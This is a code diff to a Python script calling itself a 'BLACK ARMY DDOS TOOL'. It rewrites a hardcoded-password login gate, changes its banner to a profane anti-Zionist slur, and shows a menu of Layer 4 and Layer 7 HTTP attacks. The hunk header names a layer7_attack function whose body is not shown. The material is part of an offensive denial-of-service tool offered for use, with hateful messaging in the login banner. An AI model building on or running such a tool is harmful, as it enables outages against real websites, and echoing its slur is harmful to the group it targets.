@@ -93,17 +93,21 @@ async def layer7_attack(url, concurrency, duration):
 def main():
     clear()
     display_header()
-while attemps < 100:
-    username = input("\033[100m \033[32m••> Enter your username: \033[33m \033[0m")
-    password = input("\033[100m \033[31m••> Enter your password: \033[33m \033[0m")
 
-    if username == 'tc4teen' and password == 'tc4teen':
-        print("\033[104m \033[32m DEDICATED TO THE PALESTINE STRUGGLE \033[0m")
-        break
-    else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
-        attemps += 1
-        continue
+    while attemps < 100:
+        print(f"{Fore.CYAN}┌[Cyber Attack Team")
+        username = input(f"{Fore.CYAN}└> Username please:  \033[33m")
+        print(f"{Fore.GREEN}┌[Cyber Attack Team")
+        password = input(f"{Fore.GREEN}└> Your password:  \033[33m")
+
+        if username == 'tanya' and password == 'janda sebelah':
+            
+            print(f"\033[103m••••>>     FUCKING ZIONIST...!!\033[0m")
+            break
+        else:
+            print('Incorrect credentials. Check if you have Caps lock on and try again.')
+            attemps += 1
+            continue        
     print(Fore.MAGENTA + Style.BRIGHT + "=== ⚔️ BLACK ARMY DDOS TOOL ===")
     print(Fore.YELLOW + "1. Layer 4 Attack")
     print(Fore.CYAN + "2. Layer 7 HTTP Attack")
